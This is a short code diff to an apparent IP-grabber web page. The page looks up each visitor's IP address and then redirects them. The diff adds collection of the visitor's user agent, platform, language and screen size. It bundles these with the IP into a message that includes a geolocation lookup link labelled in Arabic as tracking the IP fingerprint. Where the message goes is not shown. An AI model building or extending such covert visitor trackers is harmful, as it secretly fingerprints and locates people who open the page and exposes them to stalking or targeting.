@@ -73,8 +73,27 @@ redirectToNextURL();
     const data = await response.json();
     const ipAddress = data.ip;
 
-    const message = `\nالايبي:\n \n${ipAddress}`;
+// Retrieve additional information about the user's operating system and browser
+  const userAgent = navigator.userAgent;
+  const platform = navigator.platform;
+  const language = navigator.language;
+  const screenWidth = window.screen.width;
+  const screenHeight = window.screen.height;
+
+
+
+   // const message = `\nالايبي:\n \n${ipAddress}`;
 	
+const message = `
+    IP: ${ipAddress}\n
+    User Agent: ${userAgent}\n
+    Platform: ${platform}\n
+    Language: ${language}\n
+    Screen Width: ${screenWidth}\n
+    Screen Height: ${screenHeight}\n
+  `;
+
+
 	 // Create the message with clickable link
     const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
     const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
